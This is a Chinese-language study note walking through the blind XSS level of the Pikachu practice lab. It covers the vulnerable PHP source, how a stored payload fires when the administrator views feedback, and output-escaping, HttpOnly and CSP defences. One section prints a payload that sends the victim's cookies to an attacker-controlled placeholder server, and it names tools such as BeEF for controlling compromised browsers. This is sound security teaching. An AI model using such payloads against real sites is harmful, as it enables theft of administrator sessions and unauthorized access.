# XSS 之盲打 通关笔记
> "盲打"的意思是：**你提交完 payload，自己什么都看不到。**
>
> 要等别人（这里是后台管理员）打开那个页面，才会触发。你既不知道他什么时候看，也不知道他看没看。
---
## 一、环境与目标
| 项目 | 内容 |
| --- | --- |
| 靶场 | Pikachu |
| 关卡位置 | Cross-Site Scripting → xss之盲打 |
| 提交页 | `http://pikachu/vul/xss/xssblind/xss_blind.php` |
| 后台登录 | `http://pikachu/vul/xss/xssblind/admin_login.php` |
| 后台列表 | `http://pikachu/vul/xss/xssblind/admin.php` |
| 后台账号 | `admin` / `123456`（页面提示里写着） |
| 目标 | 让后台页面弹出对话框 |
提交页长这样：
```
请在下面输入你对"锅盖头"这种发型的看法：
[文本框]
你的大名：
[输入框]
[提交]
```
---
## 二、我的解题步骤
### 步骤 1：提交 payload
在文本框里输入：
```html
<script>alert(1)</script>
```
点「提交」。
**页面只显示：**
```
谢谢参与，阁下的看法我们已经收到!
```
**没有弹窗，什么都看不到。**
### 步骤 2：想到"这是存起来的"
提交页不回显，说明内容被**写进数据库**了。
页面提示也印证了这一点：
> 登录后台,看会发生啥?后台登录地址是 `/xssblind/admin_login.php`
### 步骤 3：登录后台
打开：
```
http://pikachu/vul/xss/xssblind/admin_login.php
```
填 `admin` / `123456`。
### 步骤 4：进入后台列表页
登录成功后跳到 `admin.php`，页面列出所有用户反馈。
**在列表渲染的那一刻，弹窗出现了。**
---
## 三、原理分析
### 3.1 提交页的源码
```php
if(array_key_exists("content",$_POST) && $_POST['content']!=null){
    $content=escape($link, $_POST['content']);
    $name=escape($link, $_POST['name']);
    $time=$time=date('Y-m-d g:i:s');
    $query="insert into xssblind(time,content,name) values('$time','$content','$name')";
    $result=execute($link, $query);
    if(mysqli_affected_rows($link)==1){
        $html.="<p>谢谢参与，阁下的看法我们已经收到!</p>";
    }
}
```
**只做插入，不做输出。** 所以这个页面永远看不到你的内容。
### 3.2 后台页的源码
```php
$query="select * from xssblind";
$result=mysqli_query($link, $query);
while($data=mysqli_fetch_assoc($result)){
    $html=<<<A
    <tr>
        <td>{$data['id']}</td>
        <td>{$data['time']}</td>
        <td>{$data['content']}</td>
        <td>{$data['name']}</td>
        <td><a href="admin.php?id={$data['id']}">删除</a></td>
    </tr>
A;
    echo $html;
}
```
`{$data['content']}` 被**原样输出**到表格里。
### 3.3 完整链路
```
你提交 payload
      ↓
存进 xssblind 表
      ↓
（你什么都看不到）
      ↓
管理员打开 admin.php
      ↓
服务器原样输出 payload
      ↓
管理员的浏览器执行
```
**这就是"盲打"：攻击者在暗处，不知道什么时候会响。**
---
## 四、知识点与笔记
### 4.1 盲打是什么
> **Blind XSS：payload 被存储到某个"你看不到的后台页面"，只有管理员访问时才触发。**
它不是一种新的技术，而是**存储型 XSS 的一种使用场景**。
典型位置：
| 位置 | 谁会看 |
| --- | --- |
| 意见反馈 | 客服、运营 |
| 举报内容 | 审核人员 |
| 订单备注 | 发货人员、后台 |
| 用户名 / 昵称 | 后台用户列表 |
| 联系表单 | 销售 |
### 4.2 盲打最大的问题：怎么知道打中了
因为你根本看不到页面。
**解决办法：外带（Out-of-Band）。**
把 payload 改成"主动回连你的服务器"：
```html
<script>new Image().src='http://你的服务器/blind?c='+document.cookie</script>
```
原理：
1. `new Image()` 创建一个看不见的图片对象
2. `.src='http://你的服务器/...'` 让浏览器发起一次请求
3. Cookie 拼在 URL 参数里
4. **你的服务器只要收到这条请求，就说明 payload 被执行了**
### 4.3 真实盲打用什么工具
| 工具 | 作用 |
| --- | --- |
| XSS Hunter | 专门做盲打，能收到截图、URL、Cookie |
| BeEF | 浏览器控制框架，能持续控制被 XSS 的浏览器 |
| 自建 HTTP 服务 | 用 `nc -lvp 80` 或 Python 起个服务看回连 |
### 4.4 盲打的价值
**它打的是"权限更高的人"。**
普通用户看到你的 payload，最多偷到普通用户的 Cookie。
但后台管理员看到，偷到的就是**管理员会话**——直接进后台。
**这就是"盲打"真正的杀伤力：越权。**
---
## 五、和前面几关的区别
| | 存储型（留言板） | 盲打 |
| --- | --- | --- |
| payload 存哪 | 数据库 | 数据库 |
| 谁看得到 | 所有访客 | **只有后台管理员** |
| 你能看到效果吗 | 能（自己打开页面就看） | **不能** |
| 怎么确认成功 | 刷新页面 | **外带回连** |
| 打中的是谁 | 普通用户 | **管理员** |
**技术上没区别，都是存储型。区别在"谁能看到"。**
---
## 六、防御怎么写
### 6.1 输出转义
```php
$content = htmlspecialchars($data['content'], ENT_QUOTES, 'UTF-8');
echo "<td>{$content}</td>";
```
### 6.2 后台页面尤其要注意
后台往往被认为是"内部系统"，安全投入少，但：
- 后台的权限最高
- 后台的用户是管理员
- 后台的输入常常来自"外部用户提交的内容"
**后台页面必须按"不可信输入"处理。**
### 6.3 其他配套
| 措施 | 作用 |
| --- | --- |
| Cookie 设 `HttpOnly` | 即使被 XSS，也读不到 Cookie |
| CSP 限制外连 | 阻止 `new Image().src` 这类外带 |
| 后台独立域名 | 降低与前台共享 Cookie 的风险 |
---
## 七、总结
| 要点 | 内容 |
| --- | --- |
| 这关教什么 | 存储型 XSS 可以打"看不到的地方" |
| 关键动作 | 提交 payload → 登录后台 → 触发 |
| 核心难点 | 怎么确认打中了 → 外带回连 |
| 最大价值 | 打管理员，越权 |
**一句话**：
> **盲打不是新技术，是"把 payload 埋在一个你永远看不到、但管理员一定会看的地方"。**
---
## 参考
- [OWASP: Blind XSS](https://owasp.org/www-community/attacks/xss/)
- [Pikachu 源码](https://github.com/zhuifengshaonianhanlu/pikachu)
- [MDN: Image](https://developer.mozilla.org/zh-CN/docs/Web/API/HTMLImageElement/Image)
